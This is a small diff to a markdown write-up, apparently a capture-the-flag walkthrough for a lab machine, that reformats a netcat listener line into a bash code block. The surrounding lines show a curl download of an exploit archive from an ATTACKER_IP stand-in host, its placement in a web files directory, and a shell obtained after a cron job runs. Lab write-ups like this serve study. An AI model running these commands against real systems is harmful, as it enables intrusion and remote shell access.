@@ -114,7 +114,8 @@ curl http://<ATTACKER_IP>:8080/exploit.zip -o /tmp/exploit.zip
 mv /tmp/exploit.zip /var/www/portal.variatype.htb/public/files/
 ```
 # Listener
-``` rlwrap nc -lvnp 5555
+```bash
+rlwrap nc -lvnp 5555
 ```
 # Result (after cron execution)
 - steve@variatype
